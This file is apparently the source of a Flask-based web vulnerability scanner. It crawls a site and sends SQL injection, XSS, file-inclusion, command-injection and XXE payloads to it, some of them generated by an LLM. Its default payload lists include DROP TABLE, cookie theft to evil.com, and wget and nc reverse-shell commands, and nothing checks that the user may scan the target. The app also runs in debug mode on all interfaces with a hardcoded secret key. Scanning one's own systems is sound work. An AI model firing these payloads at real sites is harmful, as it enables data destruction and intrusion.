from flask import Flask, render_template, request, jsonify, session
import requests
from bs4 import BeautifulSoup
import urllib.parse
import json
import time
import random
import re
from urllib.parse import urljoin, urlparse
import threading
from datetime import datetime
import sqlite3
import os
from concurrent.futures import ThreadPoolExecutor
import google.generativeai as genai

app = Flask(__name__)
app.secret_key = 'your-secret-key-change-this'

# Initialize database
def init_db():
    conn = sqlite3.connect('scanner_results.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS scan_results
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,
                  target_url TEXT,
                  vulnerability_type TEXT,
                  payload TEXT,
                  response_code INTEGER,
                  response_content TEXT,
                  is_vulnerable BOOLEAN,
                  confidence_score REAL)''')
    conn.commit()
    conn.close()

init_db()

class VulnerabilityScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.discovered_urls = set()
        self.vulnerabilities_found = []
        self.llm_model = None
        self.api_key = None
        self.ollama_model = None
        self.use_ollama = False
        
    def configure_llm(self, api_key=None, ollama_model=None, use_ollama=False):
        self.api_key = api_key
        self.ollama_model = ollama_model
        self.use_ollama = use_ollama
        
        if not use_ollama and api_key:
            genai.configure(api_key=api_key)
            self.llm_model = genai.GenerativeModel('gemini-2.0-flash-exp')
    
    def discover_urls(self, base_url, max_depth=2):
        """Discover internal URLs from the target website"""
        discovered = set()
        to_crawl = [(base_url, 0)]
        crawled = set()
        
        while to_crawl:
            url, depth = to_crawl.pop(0)
            if url in crawled or depth > max_depth:
                continue
                
            crawled.add(url)
            try:
                response = self.session.get(url, timeout=10)
                soup = BeautifulSoup(response.content, 'html.parser')
                
                # Find all links
                for link in soup.find_all(['a', 'form'], href=True):
                    href = link.get('href') or link.get('action')
                    if href:
                        full_url = urljoin(url, href)
                        parsed = urlparse(full_url)
                        base_parsed = urlparse(base_url)
                        
                        # Only include internal URLs
                        if parsed.netloc == base_parsed.netloc:
                            discovered.add(full_url)
                            if depth < max_depth:
                                to_crawl.append((full_url, depth + 1))
                                
                # Find forms and API endpoints
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    if action:
                        form_url = urljoin(url, action)
                        discovered.add(form_url)
                        
            except Exception as e:
                print(f"Error crawling {url}: {e}")
                
        self.discovered_urls = discovered
        return list(discovered)
    
    def generate_llm_payloads(self, vulnerability_type, target_url, context=""):
        """Generate sophisticated payloads using LLM"""
        if self.use_ollama and self.ollama_model:
            return self._generate_ollama_payloads(vulnerability_type, target_url, context)
        elif self.llm_model and self.api_key:
            return self._generate_gemini_payloads(vulnerability_type, target_url, context)
        else:
            return self._get_default_payloads(vulnerability_type)
    
    def _generate_gemini_payloads(self, vulnerability_type, target_url, context):
        """Generate payloads using Gemini"""
        try:
            prompt = f"""
            Generate 10 sophisticated {vulnerability_type} payloads for testing the URL: {target_url}
            Context: {context}
            
            Requirements:
            1. Include both basic and advanced payloads
            2. Consider different encoding methods (URL, HTML, Unicode, etc.)
            3. Include bypass techniques for common filters
            4. Make payloads specific to the vulnerability type
            5. Include payloads that test for different scenarios
            
            Return only the payloads, one per line, without explanations.
            """
            
            response = self.llm_model.generate_content(prompt)
            payloads = [p.strip() for p in response.text.split('\n') if p.strip()]
            return payloads[:10]  # Limit to 10 payloads
            
        except Exception as e:
            print(f"Error generating Gemini payloads: {e}")
            return self._get_default_payloads(vulnerability_type)
    
    def _generate_ollama_payloads(self, vulnerability_type, target_url, context):
        """Generate payloads using Ollama"""
        try:
            prompt = f"""Generate 10 {vulnerability_type} payloads for {target_url}. Context: {context}"""
            
            response = requests.post('http://localhost:11434/api/generate', 
                                   json={
                                       'model': self.ollama_model,
                                       'prompt': prompt,
                                       'stream': False
                                   })
            
            if response.status_code == 200:
                result = response.json()
                payloads = [p.strip() for p in result['response'].split('\n') if p.strip()]
                return payloads[:10]
            else:
                return self._get_default_payloads(vulnerability_type)
                
        except Exception as e:
            print(f"Error generating Ollama payloads: {e}")
            return self._get_default_payloads(vulnerability_type)
    
    def _get_default_payloads(self, vulnerability_type):
        """Default payloads for different vulnerability types"""
        payloads = {
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT NULL,NULL,NULL--",
                "admin'--",
                "' OR 1=1#",
                "') OR ('1'='1",
                "' WAITFOR DELAY '0:0:5'--",
                "'; EXEC xp_cmdshell('dir'); --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                "' OR SLEEP(5)--"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<script>document.location='http://evil.com/'+document.cookie</script>",
                "<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>"
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "php://filter/read=convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
                "/proc/self/environ",
                "expect://id",
                "file:///etc/passwd"
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "& dir",
                "; cat /etc/passwd",
                "| id",
                "; wget http://evil.com/shell.php",
                "`whoami`",
                "$(id)",
                "; nc -e /bin/sh evil.com 4444",
                "| curl http://evil.com/$(whoami)"
            ],
            'xxe': [
                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
                '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>',
                '<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://evil.com/evil.dtd"><data>&send;</data>',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>'
            ]
        }
        return payloads.get(vulnerability_type, [])
    
    def test_sql_injection(self, url, params=None):
        """Test for SQL injection vulnerabilities"""
        payloads = self.generate_llm_payloads('sql_injection', url)
        results = []
        
        for payload in payloads:
            try:
                # Test GET parameters
                if '?' in url:
                    test_url = url + '&test=' + urllib.parse.quote(payload)
                else:
                    test_url = url + '?test=' + urllib.parse.quote(payload)
                
                response = self.session.get(test_url, timeout=10)
                
                # Check for SQL error messages
                sql_errors = [
                    'mysql_fetch_array', 'ORA-01756', 'Microsoft OLE DB Provider',
                    'SQLServer JDBC Driver', 'PostgreSQL query failed',
                    'supplied argument is not a valid MySQL', 'mysql_num_rows',
                    'Error Occurred While Processing Request', 'Server Error',
                    'Microsoft JET Database', 'Error converting data type',
                    'Invalid column name', 'ORA-00921', 'quoted string not properly terminated'
                ]
                
                is_vulnerable = any(error.lower() in response.text.lower() for error in sql_errors)
                confidence = 0.8 if is_vulnerable else 0.1
                
                result = {
                    'url': url,
                    'vulnerability_type': 'SQL Injection',
                    'payload': payload,
                    'response_code': response.status_code,
                    'response_content': response.text[:1000],
                    'is_vulnerable': is_vulnerable,
                    'confidence_score': confidence,
                    'timestamp': datetime.now().isoformat()
                }
                
                results.append(result)
                self._save_result(result)
                
                # Add delay to avoid overwhelming the server
                time.sleep(random.uniform(0.5, 1.5))
                
            except Exception as e:
                print(f"Error testing SQL injection on {url}: {e}")
                
        return results
    
    def test_xss(self, url, params=None):
        """Test for XSS vulnerabilities"""
        payloads = self.generate_llm_payloads('xss', url)
        results = []
        
        for payload in payloads:
            try:
                # Test GET parameters
                if '?' in url:
                    test_url = url + '&xss_test=' + urllib.parse.quote(payload)
                else:
                    test_url = url + '?xss_test=' + urllib.parse.quote(payload)
                
                response = self.session.get(test_url, timeout=10)
                
                # Check if payload is reflected in response
                is_vulnerable = payload in response.text or urllib.parse.unquote(payload) in response.text
                confidence = 0.9 if is_vulnerable else 0.1
                
                result = {
                    'url': url,
                    'vulnerability_type': 'XSS',
                    'payload': payload,
                    'response_code': response.status_code,
                    'response_content': response.text[:1000],
                    'is_vulnerable': is_vulnerable,
                    'confidence_score': confidence,
                    'timestamp': datetime.now().isoformat()
                }
                
                results.append(result)
                self._save_result(result)
                
                time.sleep(random.uniform(0.5, 1.5))
                
            except Exception as e:
                print(f"Error testing XSS on {url}: {e}")
                
        return results
    
    def test_lfi(self, url, params=None):
        """Test for Local File Inclusion vulnerabilities"""
        payloads = self.generate_llm_payloads('lfi', url)
        results = []
        
        for payload in payloads:
            try:
                # Test different parameter names
                param_names = ['file', 'page', 'include', 'path', 'doc', 'url']
                
                for param in param_names:
                    if '?' in url:
                        test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check for file inclusion indicators
                    lfi_indicators = [
                        'root:x:', '/bin/bash', 'daemon:x:', 'www-data:x:',
                        '[boot loader]', '[operating systems]', 'Windows Registry Editor'
                    ]
                    
                    is_vulnerable = any(indicator in response.text for indicator in lfi_indicators)
                    confidence = 0.9 if is_vulnerable else 0.1
                    
                    result = {
                        'url': test_url,
                        'vulnerability_type': 'LFI',
                        'payload': payload,
                        'response_code': response.status_code,
                        'response_content': response.text[:1000],
                        'is_vulnerable': is_vulnerable,
                        'confidence_score': confidence,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    results.append(result)
                    self._save_result(result)
                    
                    if is_vulnerable:
                        break  # Found vulnerability, no need to test other parameters
                    
                    time.sleep(random.uniform(0.3, 0.8))
                
            except Exception as e:
                print(f"Error testing LFI on {url}: {e}")
                
        return results
    
    def test_command_injection(self, url, params=None):
        """Test for Command Injection vulnerabilities"""
        payloads = self.generate_llm_payloads('command_injection', url)
        results = []
        
        for payload in payloads:
            try:
                # Test different parameter names
                param_names = ['cmd', 'command', 'exec', 'system', 'ping', 'host', 'ip']
                
                for param in param_names:
                    if '?' in url:
                        test_url = f"{url}&{param}={urllib.parse.quote(payload)}"
                    else:
                        test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    
                    response = self.session.get(test_url, timeout=15)
                    
                    # Check for command execution indicators
                    cmd_indicators = [
                        'uid=', 'gid=', 'groups=', 'root:', 'bin/sh', 'bin/bash',
                        'Windows IP Configuration', 'Volume in drive', 'Directory of',
                        'total ', 'drwx', '-rw-', 'Permission denied', 'command not found'
                    ]
                    
                    is_vulnerable = any(indicator in response.text for indicator in cmd_indicators)
                    
                    # Check response time for blind command injection
                    if 'sleep' in payload.lower() or 'ping' in payload.lower():
                        # If response took longer than expected, might be vulnerable
                        if response.elapsed.total_seconds() > 3:
                            is_vulnerable = True
                    
                    confidence = 0.8 if is_vulnerable else 0.1
                    
                    result = {
                        'url': test_url,
                        'vulnerability_type': 'Command Injection',
                        'payload': payload,
                        'response_code': response.status_code,
                        'response_content': response.text[:1000],
                        'is_vulnerable': is_vulnerable,
                        'confidence_score': confidence,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    results.append(result)
                    self._save_result(result)
                    
                    if is_vulnerable:
                        break
                    
                    time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                print(f"Error testing Command Injection on {url}: {e}")
                
        return results
    
    def test_xxe(self, url, params=None):
        """Test for XXE (XML External Entity) vulnerabilities"""
        payloads = self.generate_llm_payloads('xxe', url)
        results = []
        
        for payload in payloads:
            try:
                # Test POST request with XML payload
                headers = {
                    'Content-Type': 'application/xml',
                    'Accept': 'application/xml, text/xml'
                }
                
                response = self.session.post(url, data=payload, headers=headers, timeout=10)
                
                # Check for XXE indicators
                xxe_indicators = [
                    'root:x:', 'daemon:x:', '/etc/passwd', 'Windows Registry Editor',
                    '<?xml', 'ENTITY', 'DOCTYPE', 'file:///', 'http://'
                ]
                
                is_vulnerable = any(indicator in response.text for indicator in xxe_indicators)
                
                # Also check for error messages that might indicate XXE processing
                error_indicators = [
                    'XML parsing error', 'External entity', 'DTD processing',
                    'libxml', 'XMLSyntaxError', 'SAXParseException'
                ]
                
                has_xml_processing = any(error in response.text for error in error_indicators)
                if has_xml_processing and not is_vulnerable:
                    confidence = 0.3  # Might be vulnerable but not confirmed
                else:
                    confidence = 0.9 if is_vulnerable else 0.1
                
                result = {
                    'url': url,
                    'vulnerability_type': 'XXE',
                    'payload': payload,
                    'response_code': response.status_code,
                    'response_content': response.text[:1000],
                    'is_vulnerable': is_vulnerable,
                    'confidence_score': confidence,
                    'timestamp': datetime.now().isoformat()
                }
                
                results.append(result)
                self._save_result(result)
                
                time.sleep(random.uniform(0.5, 1.0))
                
            except Exception as e:
                print(f"Error testing XXE on {url}: {e}")
                
        return results
    
    def _save_result(self, result):
        """Save scan result to database"""
        conn = sqlite3.connect('scanner_results.db')
        c = conn.cursor()
        c.execute('''INSERT INTO scan_results 
                     (timestamp, target_url, vulnerability_type, payload, 
                      response_code, response_content, is_vulnerable, confidence_score)
                     VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                  (result['timestamp'], result['url'], result['vulnerability_type'],
                   result['payload'], result['response_code'], result['response_content'],
                   result['is_vulnerable'], result['confidence_score']))
        conn.commit()
        conn.close()
    
    def run_comprehensive_scan(self, target_url, scan_types=None):
        """Run comprehensive vulnerability scan"""
        if scan_types is None:
            scan_types = ['sql_injection', 'xss', 'lfi', 'command_injection', 'xxe']
        
        # Discover URLs first
        print("Discovering internal URLs...")
        urls = self.discover_urls(target_url)
        urls.append(target_url)  # Include the main URL
        
        all_results = []
        
        # Test each URL for each vulnerability type
        for url in urls:
            for scan_type in scan_types:
                print(f"Testing {scan_type} on {url}")
                
                if scan_type == 'sql_injection':
                    results = self.test_sql_injection(url)
                elif scan_type == 'xss':
                    results = self.test_xss(url)
                elif scan_type == 'lfi':
                    results = self.test_lfi(url)
                elif scan_type == 'command_injection':
                    results = self.test_command_injection(url)
                elif scan_type == 'xxe':
                    results = self.test_xxe(url)
                
                all_results.extend(results)
        
        return all_results

# Global scanner instance
scanner = VulnerabilityScanner()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/configure', methods=['POST'])
def configure():
    data = request.json
    target_url = data.get('target_url')
    api_key = data.get('api_key')
    ollama_model = data.get('ollama_model')
    use_ollama = data.get('use_ollama', False)
    
    session['target_url'] = target_url
    scanner.configure_llm(api_key, ollama_model, use_ollama)
    
    return jsonify({'status': 'configured'})

@app.route('/discover_urls', methods=['POST'])
def discover_urls():
    target_url = session.get('target_url')
    if not target_url:
        return jsonify({'error': 'No target URL configured'})
    
    urls = scanner.discover_urls(target_url)
    return jsonify({'urls': urls})

@app.route('/scan', methods=['POST'])
def scan():
    data = request.json
    target_url = session.get('target_url')
    scan_types = data.get('scan_types', ['sql_injection', 'xss', 'lfi'])
    
    if not target_url:
        return jsonify({'error': 'No target URL configured'})
    
    # Run scan in background thread
    def run_scan():
        results = scanner.run_comprehensive_scan(target_url, scan_types)
        session['last_scan_results'] = results
    
    thread = threading.Thread(target=run_scan)
    thread.start()
    
    return jsonify({'status': 'scan_started'})

@app.route('/results')
def get_results():
    conn = sqlite3.connect('scanner_results.db')
    c = conn.cursor()
    c.execute('''SELECT * FROM scan_results ORDER BY timestamp DESC LIMIT 100''')
    results = c.fetchall()
    conn.close()
    
    formatted_results = []
    for result in results:
        formatted_results.append({
            'id': result[0],
            'timestamp': result[1],
            'target_url': result[2],
            'vulnerability_type': result[3],
            'payload': result[4],
            'response_code': result[5],
            'response_content': result[6][:200] + '...' if len(result[6]) > 200 else result[6],
            'is_vulnerable': result[7],
            'confidence_score': result[8]
        })
    
    return jsonify({'results': formatted_results})

@app.route('/status')
def get_status():
    return jsonify({
        'discovered_urls_count': len(scanner.discovered_urls),
        'vulnerabilities_found': len([r for r in scanner.vulnerabilities_found if r.get('is_vulnerable')]),
        'llm_configured': scanner.llm_model is not None or scanner.use_ollama
    })

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)